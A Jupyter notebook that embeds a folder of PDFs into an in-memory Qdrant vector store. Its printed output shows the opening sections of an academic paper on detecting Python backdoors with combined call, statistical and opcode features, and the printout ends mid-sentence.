{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4c9c3bd3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: sentence_transformers in ./env/lib/python3.11/site-packages (4.0.2)\n",
      "Requirement already satisfied: transformers<5.0.0,>=4.41.0 in ./env/lib/python3.11/site-packages (from sentence_transformers) (4.50.3)\n",
      "Requirement already satisfied: tqdm in ./env/lib/python3.11/site-packages (from sentence_transformers) (4.67.1)\n",
      "Requirement already satisfied: torch>=1.11.0 in ./env/lib/python3.11/site-packages (from sentence_transformers) (2.6.0)\n",
      "Requirement already satisfied: scikit-learn in ./env/lib/python3.11/site-packages (from sentence_transformers) (1.6.1)\n",
      "Requirement already satisfied: scipy in ./env/lib/python3.11/site-packages (from sentence_transformers) (1.15.2)\n",
      "Requirement already satisfied: huggingface-hub>=0.20.0 in ./env/lib/python3.11/site-packages (from sentence_transformers) (0.30.1)\n",
      "Requirement already satisfied: Pillow in ./env/lib/python3.11/site-packages (from sentence_transformers) (11.1.0)\n",
      "Requirement already satisfied: typing_extensions>=4.5.0 in ./env/lib/python3.11/site-packages (from sentence_transformers) (4.13.1)\n",
      "Requirement already satisfied: filelock in ./env/lib/python3.11/site-packages (from huggingface-hub>=0.20.0->sentence_transformers) (3.18.0)\n",
      "Requirement already satisfied: fsspec>=2023.5.0 in ./env/lib/python3.11/site-packages (from huggingface-hub>=0.20.0->sentence_transformers) (2025.3.2)\n",
      "Requirement already satisfied: packaging>=20.9 in ./env/lib/python3.11/site-packages (from huggingface-hub>=0.20.0->sentence_transformers) (24.2)\n",
      "Requirement already satisfied: pyyaml>=5.1 in ./env/lib/python3.11/site-packages (from huggingface-hub>=0.20.0->sentence_transformers) (6.0.2)\n",
      "Requirement already satisfied: requests in ./env/lib/python3.11/site-packages (from huggingface-hub>=0.20.0->sentence_transformers) (2.32.3)\n",
      "Requirement already satisfied: networkx in ./env/lib/python3.11/site-packages (from torch>=1.11.0->sentence_transformers) (3.4.2)\n",
      "Requirement already satisfied: jinja2 in ./env/lib/python3.11/site-packages (from torch>=1.11.0->sentence_transformers) (3.1.6)\n",
      "Requirement already satisfied: sympy==1.13.1 in ./env/lib/python3.11/site-packages (from torch>=1.11.0->sentence_transformers) (1.13.1)\n",
      "Requirement already satisfied: mpmath<1.4,>=1.1.0 in ./env/lib/python3.11/site-packages (from sympy==1.13.1->torch>=1.11.0->sentence_transformers) (1.3.0)\n",
      "Requirement already satisfied: numpy>=1.17 in ./env/lib/python3.11/site-packages (from transformers<5.0.0,>=4.41.0->sentence_transformers) (2.2.4)\n",
      "Requirement already satisfied: regex!=2019.12.17 in ./env/lib/python3.11/site-packages (from transformers<5.0.0,>=4.41.0->sentence_transformers) (2024.11.6)\n",
      "Requirement already satisfied: tokenizers<0.22,>=0.21 in ./env/lib/python3.11/site-packages (from transformers<5.0.0,>=4.41.0->sentence_transformers) (0.21.1)\n",
      "Requirement already satisfied: safetensors>=0.4.3 in ./env/lib/python3.11/site-packages (from transformers<5.0.0,>=4.41.0->sentence_transformers) (0.5.3)\n",
      "Requirement already satisfied: joblib>=1.2.0 in ./env/lib/python3.11/site-packages (from scikit-learn->sentence_transformers) (1.4.2)\n",
      "Requirement already satisfied: threadpoolctl>=3.1.0 in ./env/lib/python3.11/site-packages (from scikit-learn->sentence_transformers) (3.6.0)\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in ./env/lib/python3.11/site-packages (from jinja2->torch>=1.11.0->sentence_transformers) (3.0.2)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in ./env/lib/python3.11/site-packages (from requests->huggingface-hub>=0.20.0->sentence_transformers) (3.4.1)\n",
      "Requirement already satisfied: idna<4,>=2.5 in ./env/lib/python3.11/site-packages (from requests->huggingface-hub>=0.20.0->sentence_transformers) (3.10)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in ./env/lib/python3.11/site-packages (from requests->huggingface-hub>=0.20.0->sentence_transformers) (2.3.0)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in ./env/lib/python3.11/site-packages (from requests->huggingface-hub>=0.20.0->sentence_transformers) (2025.1.31)\n",
      "\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m A new release of pip available: \u001b[0m\u001b[31;49m22.3\u001b[0m\u001b[39;49m -> \u001b[0m\u001b[32;49m25.0.1\u001b[0m\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m To update, run: \u001b[0m\u001b[32;49mpip install --upgrade pip\u001b[0m\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install -U sentence_transformers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "9922aa73",
   "metadata": {},
   "outputs": [],
   "source": [
    "from qdrant_client import models, QdrantClient\n",
    "from sentence_transformers import SentenceTransformer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "79d5dbe5",
   "metadata": {},
   "outputs": [],
   "source": [
    "encoder = SentenceTransformer(\"all-MiniLM-L6-v2\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "07c4f19e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pypdf\n",
    "\n",
    "def read_pdf(pdf_path, chunk_size=1000):\n",
    "    \"\"\"\n",
    "    Reads a PDF file, extracts metadata, and chunks the text content into 1000-word segments.\n",
    "\n",
    "    Args:\n",
    "        pdf_path (str): The path to the PDF file.\n",
    "\n",
    "    Returns:\n",
    "        dict: A dictionary containing metadata and a list of text chunks.\n",
    "    \"\"\"\n",
    "    try:\n",
    "        with open(pdf_path, 'rb') as pdf_file:\n",
    "            reader = pypdf.PdfReader(pdf_file)\n",
    "            text = \"\"\n",
    "            for page in reader.pages:\n",
    "                text += page.extract_text()\n",
    "\n",
    "            metadata = reader.metadata\n",
    "            # Chunk the text into 1000-word segments\n",
    "            # words = text.split()\n",
    "            # chunks = [' '.join(words[i:i + chunk_size]) for i in range(0, len(words), chunk_size)]\n",
    "\n",
    "            return {\n",
    "                'metadata': metadata,\n",
    "                'data': text,\n",
    "            }\n",
    "    except Exception as e:\n",
    "        print(f\"Error reading PDF: {e}\")\n",
    "        return None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "95fa8f2d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "documents = []\n",
    "folder_path = './Other'\n",
    "for filename in os.listdir(folder_path):\n",
    "    if filename.endswith('.pdf'):\n",
    "        pdf_path = os.path.join(folder_path, filename)\n",
    "        pdf_data = read_pdf(pdf_path)\n",
    "        if pdf_data:\n",
    "            documents.append(pdf_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "f601b3b8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(documents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "1ee7476e",
   "metadata": {},
   "outputs": [],
   "source": [
    "client = QdrantClient(\":memory:\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "a1b184a9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "client.create_collection(\n",
    "    collection_name=\"my_papers\",\n",
    "    vectors_config=models.VectorParams(\n",
    "        size=encoder.get_sentence_embedding_dimension(),  # Vector size is defined by used model\n",
    "        distance=models.Distance.COSINE,\n",
    "    ),\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "f8c2a2b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "client.upload_points(\n",
    "    collection_name=\"my_papers\",\n",
    "    points=[\n",
    "        models.PointStruct(\n",
    "            id=idx, vector=encoder.encode(doc[\"data\"]).tolist(), payload=doc\n",
    "        )\n",
    "        for idx, doc in enumerate(documents)\n",
    "    ],\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f179d739",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'metadata': {'/Creator': 'Aspose Pty Ltd.', '/ModDate': \"D:20250325022231-07'00'\", '/CreationDate': \"D:20210913202330+05'30'\", '/Producer': 'Aspose.PDF for .NET 23.2.0; modified using iText 4.2.0 by 1T3XT', '/Subject': 'Security and Communication Networks 2021.2021:9923234', '/WPS-PROCLEVEL': '3', '/WPS-JOURNALDOI': '10.1155/2037', '/Title': 'PBDT: Python Backdoor Detection Model Based on Combined Features', '/WPS-ARTICLEDOI': '10.1155/2021/9923234'}, 'data': \"Research Article\\nPBDT: Python Backdoor Detection Model Based on\\nCombined Features\\nYong Fang, Mingyu Xie, and Cheng Huang\\nSchool of Cyber Science and Engineering, Sichuan University, Chengdu, China\\nCorrespondence should be addressed to Cheng Huang; opcodesec@gmail.com\\nReceived 1 April 2021; Accepted 31 August 2021; Published 14 September 2021\\nAcademic\\nEditor: Shah Nazir\\nCopyright © 2021 Yong Fang et al. 'is is an open access article distributed under the Creative Commons Attribution License,\\nwhich permits unrestricted use, distribution, and reproduction in any medium, provided the original work is properly cited.\\nApplication security is essential in today’s highly development period. Backdoor is a means by which attackers can invade the\\nsystem to achieve illegal purposes and damage users’ rights. It has posed a serious threat to network security. 'us, it is urgent to\\ntakeadequatemeasurestodefendsuchattacks.PreviousresearchworkwasmainlyfocusedonnumerousPHPwebshells,withless\\nresearch on Python backdoor ﬁles. Language diﬀerences make the method not entirely applicable. 'is paper proposes a Python\\nbackdoor detection model named PBDT based on combined features. 'e model summarizes the common functional modules\\nandfunctionsinthebackdoorﬁlesandextractsthenumberofcallsinthetexttoformsamplefeatures.Whatismore,weconsider\\nthe text’s statistical characteristics, including the information entropy, the longest string, etc., to identify the obfuscated Python\\ncode. Besides, the opcode sequence is used to represent code characteristics, such as TF-IDF vector and FastText classiﬁer, to\\neliminate the inﬂuence of interference items. Finally, we introduce the Random Forest algorithm to build a classiﬁer. Covering\\nmosttypesofbackdoors,somesamplesareobfuscated,themodelachievesanaccuracyof97.70%,andtheTNRindexisashighas\\n98.66%, showing a good classiﬁcation performance in Python backdoor detection.\\n1. Introduction\\nWiththerapiddevelopmentofnetworktechnologyinrecent\\nyears, various applications have become the primary way to\\nprovide information services, signiﬁcantly improving the\\nconvenienceofpeople’s life. However,oncecriminalsutilize\\nit, it will cause data leakage and property damage. Among\\nthem, the backdoor is an eﬀective means for attackers to\\nachieve the purpose of intrusion. 'e 2020 State of Malware\\nReport [1] released by Malwarebytes Labs shows that\\nbackdoors have continuously become the top ten common\\nsecurity threat’s categories among users and commercial\\nproducts, and the proportion is increasing. Suﬃcient\\nidentiﬁcation of backdoors to take further measures has\\nbecome the current research’s focus in cyber security.\\nAs a concise, easy-to-read, and extensible programming\\nlanguage, Python has beenwidely used in large-scale project\\ndevelopment while initially only writing automated scripts.\\nNevertheless, there is little research on malicious Python\\ncode. Most of the existing backdoor-related research is\\naimed at PHP or general-purpose webshells [2–8] and has\\nnotconsideredotherbackdoortypes.Simultaneously,dueto\\nthediﬀerencesinprogramminglanguages,existingmethods\\nare not fully applicable to Python text. 'ere are feature\\nselections for programming language functions or pro-\\ngramming features in the research methods, such as PHP\\nlanguage tags “<?php. . .?>”, “shell_exec ()” functions, etc.\\n'ese features should have corresponding changes to the\\nPython language. At the same time, the previous research\\ndid not involve a more detailed analysis and summary of\\nfunction behavior of the backdoor. We think that these are\\nessential when judging the maliciousness.\\n'e attacker will use the backdoor to perform a series of\\nsubsequent operations, which must leave traces on the\\nvictim’s host. Some studies [9, 10] use the dynamic acqui-\\nsition of logs and other information to capture backdoor\\nbehaviors for detection. However, some can use system\\nprocesses to hide their existence, such as thread insertion\\nbackdoor (Section 2.1), and this method does not identify\\nwell. As deep learning is widely used in the security ﬁeld,\\nsome papers [11–14] use deep neural networks to check\\nwebshells and achieve good results. Nevertheless, Python\\nHindawi\\nSecurity and Communication Networks\\nVolume 2021, Article ID 9923234, 13 pages\\nhttps://doi.org/10.1155/2021/9923234\\nbackdoordatasetissparse,sotrainingadeepneuralnetwork\\nmay cause overﬁtting and consume numerous system re-\\nsources, resulting in poor overall performance. Moreover,\\nthe full-text feature extraction ignores the functions and\\nmodules that implement the backdoor’s basic functions.\\nDetailed research on malicious python code behavior has\\nbecome a research point that needs to be broken.\\n'is paper uses machine learning method for Python\\nbackdoor detection by combining multiple features such as\\nfunction calls, text statistics, and opcodes. First, we analyze\\nthe modules and functions required for the basic functions\\nof Python backdoor, includingtext encryption, network\\ncommunication, process settings, ﬁle operations, command\\nexecution,and system control.'en,wecountthe numberof\\ntimes the suspicious module or function appears in the text\\nandrecordthesuspiciousfunction’scodeline.Whatismore,\\nthe entire text’s statistical characteristics, includinginfor-\\nmation entropy, longest string, coincidence index, andcom-\\npression rate, are obtained to capture the characteristics of\\nobfuscated codes. We also consider the number of IP, URL,\\nandmanydangerouskeywordsthat frequentlyappearin the\\nbackdoor. In addition, using the opcode information, the\\ncode is represented by the statistical features of the overall\\ntext and suspicious function lines, the TF-IDF feature\\nrepresenting the contextual relevance, and the FastText\\nfeature. Finally, it is sent to the Random Forest classiﬁer to\\ndetermine whether it belongs to the backdoor. 'e main\\ncontributions of this paper are as follows:\\n(1) Inresponsetolackofdataset,wemanuallygenerated\\nsome Python backdoor samples, including rebound\\nshell and obfuscated code, to expand the sample\\nlibrary and improve the accuracy of classiﬁer\\ndetection.\\n(2) By analyzing many real samples, the malicious\\nfunctionsandmodulesfrequentlyusedinthePython\\nbackdoor are summarized to distinguish the benign\\nandmalicioussample.Weintegratemultipletypesof\\nfeatures to classify malicious codes. Both statistical\\nfeatures and opcode features can eliminate the in-\\nﬂuence of obfuscated codes and ignore irrelevant\\ninformation such as text comments. Simultaneously,\\nthen-gramvalueselectionfullyconsidersthePython\\nopcode’s characteristics and accurately represents\\nthe text information.\\n(3) We collect a total of 2,026 samples to test the pro-\\nposed model, including 1,511 benign Python codes\\nand 515 Python backdoor codes. In the end, all\\nindicators of PBDT reach more than 95%, and the\\naccuracy is as high as 97.7%.\\nTo verify the validity of PBDT, a series of comparative\\nexperiments are designed. 'e results show that, compared\\nwith other machine learning algorithms, Random Forest\\nhas better performance in the classiﬁcation of Python\\nbackdoors,and the performanceof thecombinedfeature is\\nbetter than any single feature, which also has a more re-\\nmarkable performance improvement than the previous\\npaper method.\\n'e rest of this paper is organized as follows. Section 2\\nintroducestherelevantbackground,includingthedeﬁnition\\nand classiﬁcation of backdoors and previous research work.\\nWe will describe the PBDTsystem architecture and speciﬁc\\nimplementation methods in Section 3. Subsequently, in\\nSection 4, the dataset and the evaluation results of PBDTare\\nexplained and analyzed. Finally, Section 5 summarizes the\\nfull study.\\n2. Background\\n2.1. Backdoor. 'omas and Francillon [15] deﬁnition of the\\nbackdoor is that the intentional structure existing in the\\nsystem undermines the original security of the system by\\nproviding convenient access to other privileged functions or\\ninformation. In other words, the backdoor refers to a\\nprogram method that bypasses security controls such as\\nauthentication to obtain system permissions, whose com-\\nmon types include webshell, C/S backdoor, thread insertion\\nbackdoor, and extended backdoor:\\n(1) Webshell refers to the backdoor program that exists\\ninthewebapplication.'eﬁleformatincludesPHP,\\nASP, JSP, Python, and so on. After the attacker\\nexploits the vulnerability to invade the website, the\\nwebshell is placed in the server ﬁle directory for\\nsubsequent remote control, execution of malicious\\ncommands, and other operations.\\n(2) C/S backdoor uses a client/server model to achieve\\nthe control operation, some of which are similar to\\ntraditional Trojan programs’ principles. After the\\nattackerimplantstheserverintothetargetcomputer,\\nthe client starts the backdoor to control it. Rebound\\nshellisalsobased onthismode,but thetworolesare\\nprecisely the opposite. 'e attacker runs a server\\nprogram to monitor a speciﬁc TCP/UDP port, and\\nthe victim host initiates a request for an active\\nconnection. 'is rebound connection is usually\\napplicable to scenarios such as restricted ﬁrewalls,\\noccupied ports, and insuﬃcient permissions on the\\ncontrolled end.\\n(3) 'read insertion backdoor does not have an inde-\\npendent process when it runs but inserts into a\\nparticular service or thread of the system, which is\\nnow a mainstream type of backdoor. However, it is\\nrelatively diﬃcult to detect or kill, and traditional\\nﬁrewalls cannot eﬀectively defend against it.\\n(4) 'e extended backdoor usually concentrates a va-\\nriety of common functions, including system user\\ndetection, port opening, opening/stopping services,\\nHTTP access, and ﬁle upload/download. It has\\npowerful functions but relatively inadequate\\nconcealment.\\nPython has simple structures but powerful functions.\\nAttackers only need to write scripts’ dozens of lines to es-\\ntablish a persistent backdoor. And because Python is a\\ncommon language used by administrators, there is no no-\\nticeable diﬀerence between malicious Python traﬃc and the\\n2 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntraﬃc generated by daily network management tools, so it is\\ndiﬃcult to be detected by the terminal detection response\\nsystem, and it is quite popular with hackers. As a result, the\\ntraditional backdoor recognition method is not universal,\\nand it is particularly important to realize an eﬀective de-\\ntection of Python backdoor scripts.\\n2.2. Related Work. At present, there is little research on\\nPython malicious code in security ﬁeld. 'e papers on\\nbackdoor detection mainly focus on webshell. At the same\\ntime, JavaScript is also used as an interpretable language,\\nand part of the detection methods of malicious statements\\ncan be used in other language types. 'is section will in-\\ntroduce existing research on webshell and malicious\\nJavaScript from the perspective of static detection and\\ndynamic detection. Among them, the more typical papers\\nare summarized in Table 1.\\n2.2.1. Static Detection. Static detection mainly identiﬁes\\nmalicious code by analyzing the grammatical structure and\\nstatisticalcharacteristicsofthesourcecode.'emostclassic\\nmethod is to build a black or white list and detect malicious\\nﬁles through simple string’s regular matching. NeoPi [16] is\\na classic webshell open-source detection tool. It considers\\nthe document’s statistical characteristics to determine\\nwhether it is obfuscated and matched some feature function\\nfordetection.However,thefeaturedatabaseisrelativelyold.\\nTu et al. [20] detected webshells in applications based on\\nmalicious signatures and malicious functions. At the same\\ntime, it was proposed to consider only the longest word’s\\nbeginning and ending with the header tag. 'is method\\nreduced the false positives from NeoPi’s 24.5% to 6.7%, but\\nits detection essence was still simple character matching.\\nLawrence et al. [2] designed a ﬁrewall tool to intercept and\\nalert calls to system functions that were not in the whitelist.\\nHowever, due to the limited whitelist, there were high false\\npositives, and the webshell that was encrypted and obfus-\\ncated by complicated means could not be identiﬁed.\\nIt is impossible to obtain the function’s language envi-\\nronment only by manually deﬁned black and white lists,\\nwhich will cause many false positives. Besides, due to the\\ncontinuous variation of malicious code types, the rule base’s\\nupdateiscritical, and falsenegatives are inevitable.With the\\nwidespreadapplicationofmachinelearninginvariousﬁelds,\\nit has also been used to detect malicious code, improving\\ndetection accuracy by combining with information such as\\ncode syntax and semantics. AL-Taharwa et al. [21] proposed\\nand implemented a JavaScript obfuscation detector JSOD,\\nwhich focused on obfuscated scripts. It ﬁrst performed anti-\\nobfuscation processing and extracted the contextual se-\\nmantic information of the code by using the AST (Abstract\\nSyntax Tree). 'en the malicious JavaScript was detected by\\nthe Bayesian classiﬁer. Fass et al. [17] proposed a pre-de-\\ntection system JStap for malicious JavaScript. Based on\\nexistinglexicalandASTdetection,thesystemaddedthecode\\nCFG(ControlFlowGraph)andPDG(ProgramDependency\\nGraph), fully considering the syntax and semantic infor-\\nmation of the program. Finally, it was classiﬁed by Random\\nForest. While using machine learning, the eﬀect of basic\\nfunctions on the maliciousness of the code cannot be\\nignored.\\n'e most common language type in webshell is PHP.\\nOpcodesaretheinstructionsandﬁeldsofthePHPoperation\\nperforming, which can eliminate interference from irrele-\\nvant items. In recent years, it has been often used in PHP\\nwebshell detection. Cui [18] designed a webshell detection\\nmodel, RF-GBDT, which considered the statistical charac-\\nteristics of PHP ﬁles. Furthermore, the model extracted the\\nTF-IDF vector and the hash vector of the opcode sequence.\\nAfter integrating all the features, the webshell was recog-\\nnized through Random Forest and gradient boosting deci-\\nsion tree. Fang et al. [22] proposed and implemented the\\nPHP webshell detection system FRF-WD. 'ey innovatively\\nusedtheFastTexttextclassiﬁertocharacterizePHP’sopcode\\nsequence, integrating its classiﬁcation results and statistical\\nfeatures as the Random Forest classiﬁer’s input. In addition\\nto the statistical and opcode features mentioned above, Pan\\netal.‘s[23]detectionmethodofwebshellusedASTtoobtain\\nexecutable data features of PHP code, fully considering the\\nexecution data ﬂow and function parameter characteristics\\nofcommonsystemcommands.'eopcodesequenceshould\\nbecombinedwiththebestn-gramvaluetoeﬀectivelyensure\\nthe detection eﬀect.\\nWith the rapid development and application [24, 25] of\\ndeepneuralnetworks,opcodesareoftencombinedtorealize\\nthe webshell detection function. Yong et al. [14] detected\\nPHP webshell based on DNN (deep neural network),\\nextracted opcode features through 2-gram and TF-IDF\\ngrammar models, and input them into a DNN model\\ncomposed of CNN (convolutional neural network), LSTM\\n(long short-term memory), and MLP (multilayer percep-\\ntron) for detection. But the model consumes a lot of\\ncomputing and storage resources. Word vector is a com-\\nmonlyusedrepresentationmethodintextclassiﬁcation,and\\nit has also shown good detection advantages in malicious\\ncode detection in the recent years. Tian et al. [12] detected\\nwebshells with HTTP request packets, used Word2vec to\\nconvert the collected packet text into word vectors, and\\nﬁnally implemented classiﬁcation through the CNN model.\\nNdichu et al. [26] proposed a malicious JavaScript detection\\nscheme, which used the Doc2vec model to characterize the\\nsource code context’s features and input them into the SVM\\nclassiﬁer to determine the program’s maliciousness.\\nInsummary,staticdetectioncanuselimitedresourcesto\\nachieve better detection results, but false negatives and false\\npositives are inevitable. How to improve detection accuracy\\nis a problem that needs to be focused on. 'e relevant re-\\nsearch introduced above is aimed at languages such as PHP\\nand JavaScript. Improving the existing methods to make\\nthem suitable for Python malicious code detection is a di-\\nrection worth studying.\\n2.2.2. Dynamic Detection. 'e main idea of dynamic de-\\ntection is to dynamically execute sample ﬁles, monitor\\nnetwork traﬃc, or call sensitive functions to identify mali-\\ncious code. 'is method is often used to analyze speciﬁc\\nSecurity and Communication Networks 3\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nbehavior types of ﬁles, including extracting HTTP\\nrequesting or responding to payload characteristics, and\\nhooking sensitive functions.\\nKimetal.[27]designedaframeworkcalledJsSandboxto\\ndetect malicious JavaScript. 'rough IFH (internal function\\nhooking) monitoring and analysis of sample code behavior,\\nfunctions that could not be executed by API hooking could\\nbe extracted. 'is method was commonly used in other\\nmaliciouscode classiﬁcationtasksand wouldnot beaﬀected\\nby operations such as code deformation and obfuscation on\\ndetection performance. Canali et al. [9] used honeypot\\ntechnology to obtain and analyze the attacker’s behavioral\\ncharacteristics’ destruction of the target. 'e information\\nsource included HTTP request logs and ﬁles modiﬁed or\\ngenerated after the attacker obtained the victim host’s\\npermission. It also focused on analyzing common webshell\\nbehaviors. Xie and Hu [10] developed an anomaly detection\\nsystemthatcanidentifywebshells.'eyanalyzedADFA-LD\\nintrusion detection datasets, obtained log behaviors, and\\nused the K-nearest neighbor (KNN) algorithm to cluster\\nthem.Althoughdynamicdetectioncaneﬀectivelyreducethe\\nrate of false positive and false negative, it consumes more\\nresources and it is not suitable for detection tasks with\\nmultiple samples. At the same time, there may be a big gap\\nbetweentheactualapplicationandthedetectioneﬀectinthe\\nideal experimental environment.\\n'erefore, studies have combined static and dynamic\\ndetection to achieve better classiﬁcation results with limited\\nresources. Rieck et al. [28] proposed Cujo, a malicious\\nJavaScript automated detection system, which analyzed by\\ncombining static lexical features and dynamic runtime\\nfeatures. 'e dynamic analysis used sandbox to obtain web\\npagecode,providedanalysisreports,andﬁnallymappedthe\\nreport results to vector space. 'e ﬁnal detection model was\\ngenerated based on SVM machine learning. Wang et al. [19]\\nresearched and implemented the JavaScript malware de-\\ntection tool JSDC. First, it used the extracted text, program\\ninformation, and dangerous function call features to detect\\nbased on machine learning. According to attack feature\\nvector and dynamic execution trajectory, malware was di-\\nvided into eight attack types. 'e dynamic and static\\ncombination achieved a false positive rate of 0.2123% and a\\nfalse negative rate of 0.8492%. Starov et al. [3] conducted an\\nin-depth analysis of common webshell behaviors based on\\ntwo dimensions of static analysis and dynamic analysis.\\n'roughstaticanalysis,itwasfoundthatmostofthesample\\nattacks included ﬁle browsing and uploading, system in-\\nformationviewing,commandexecution,etc.,whiledynamic\\nanalysisfoundthatmostofthemwouldtrytoaccesslinksor\\ndirectories such as http://∗and /etc/∗.\\nDynamic detection performs better in identifying\\nmalicious code behavior, but its inherent defects have high\\nrequirementsforresourceenvironmentandsamples,andits\\napplication in practice is limited. It is necessary to consider\\nvarious factors to select a suitable detection method\\ncomprehensively.\\n3. Methodology\\n'ePBDTmodelproposedinthispaperisconstructedbased\\non multiple features. Various features can be used for\\nclassiﬁcation alone or in combination. Experimental data\\nwill be used to illustrate the performance of each combi-\\nnation in Section 4.3. 'e architectural designed is shown in\\nFigure 1. It has three categories, including sample module\\nandfunction call features,text statistical features,andopcode\\nfeatures.\\n'e calling feature involves six types of modules and\\nfunctions, including text encryption, network communica-\\ntion, process settings, ﬁle operations, command execution,and\\nsystem control,tocapturepotentiallydangerousbehaviorsof\\nthesample.However,thebackdoorﬁlemaybeobfuscatedto\\navoid detection, so text statistical features are added to\\nidentify the obfuscated sample ﬁle through typical param-\\neters such asinformation entropy, longest string, coincidence\\nindex, and compression rate. At the same time, this part\\ninvolvestheIP,URL,anddangerouskeywordsthatarelikely\\nto exist in the backdoor. It is impossible to identify the\\nbackdoor based on the above-mentioned manually deﬁned\\nmalicious behaviors accurately. 'erefore, the opcode-re-\\nlated features are added, including the simple statistical\\nfeatures of the overall text and the suspicious function line,\\nthe TF-IDF feature indicating the importance of words, and\\nthe FastText feature of the eﬃcient text classiﬁer to com-\\nprehensively analyze the meaning of the opcode. Finally,\\nthese features are combined as the feature vector and input\\nT able1: Summary of related work.\\nAuthor Main work Shortcoming\\nStatic\\ndetection\\nScottandHagen\\n[16]\\nIdentifying obfuscated webshells through statistical\\nfeatures\\n'e feature library is old, and using simple\\ncharacter matching with high false positives\\nFass et al. [17] Extracting JavaScript semantic information through\\nAST, CFG, and PDG for malicious judgment\\nNo analysis and consideration of basic\\nfunctions with malicious intent\\nCui et al. [18] Using TF-IDF vectors and hash vectors to obtain\\nwebshell opcode features for detection\\nNo semantic information is considered,\\nwhich may result in false negative\\nYong et al. [14]\\nProcessing opcode through 2-gram and TF-IDF, and\\nusing composite neural network DNN for webshell’s\\nclassiﬁcation\\nDeep neural network is too complex and\\nconsumes a lot of resources\\nDynamic\\ndetection\\nCanali and\\nBalzarotti [9]\\nAnalysis of common webshell behavior using honeypot\\ntechnology\\nHigh requirements for resources,\\nenvironment, and samples\\nWang et al. [19] Combining attack feature’s vectors and dynamic\\nexecution trajectories\\n'etypesofmalicious functionssummarized\\nare not comprehensive\\n4 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ninto the Random Forest classiﬁer to classify Python samples\\nand accurately distinguish backdoor ﬁles with malicious\\nbehavior.\\nSome of the above features are proposed by previous\\nresearchers and some are proposed in this paper, which we\\nsummarize and illustrate in Table 2. For the old features, the\\nimprovements made in this paper are noted in the third\\ncolumn of the table. In the following, various features and\\nclassiﬁer selection will be introduced in detail.\\n3.1. Call Features. It can be seen from the deﬁnition of\\nbackdoor that the two key points worth noting are\\n“bypassing security controls” and “obtaining system per-\\nmissions.” 'erefore, there must be speciﬁc modules and\\nfunctionstoimplementcorrespondingfunctions.Wecollect\\nand analyze numerous backdoor samples, combining with\\ndata summary and empirical analysis, and divide the\\nbackdoor’s common behaviors into the following six cate-\\ngories (Sections 3.3.1–3.1.6). At the same time, we list the\\nmodules and functions required to implement each type of\\nfunction. See Table 3 for details.\\nMost of the function’s acquisition in the ﬁle directly\\nperforms regular matching on the text, such as[16]. 'e\\nshortcomings of this method are obvious. When the cor-\\nresponding function exists in the comment, it will be\\nregarded as called. But in fact, the function has not been\\nexecuted, andof course,there will beno maliciousbehavior.\\n'is paper analyzes the ASTof Python code, extracts the ﬁle\\nimport module and call function information, and obtains\\nthe number of various dangerous modules and functions\\nafter counting, as the call features part of the ﬁnal\\nclassiﬁcation.\\nAST is a tree-like representation of the abstract gram-\\nmatical structure of a programming language. As the input\\nof the compiler’s back-end, it does not depend on speciﬁc\\ngrammar and language details and represents information\\non the semantic level of code. Currently, AST has been\\nwidely used in the detection of malicious code\\n[17, 21, 29–33]. 'is method can eliminate the inﬂuence of\\nannotations on text analysis and eﬀectively extracts infor-\\nmationaboutimportedmodulesandcallingfunctions.Ifitis\\ndetermined to be a suspicious function, recording the\\nnumber of lines in the source ﬁle to obtain the line’s opcode\\ninformation (Section 3.3.1) and ﬁnally returns it as a result\\nfor in-depth study and analysis of suspicious ﬁle behavior.\\n3.1.1. Text Encryption.'e backdoor uses some obfuscation\\nmethods to bypass the security control and evade the\\nsoftware’s detection and killing of system. 'e most com-\\nmon one is to use algorithms to 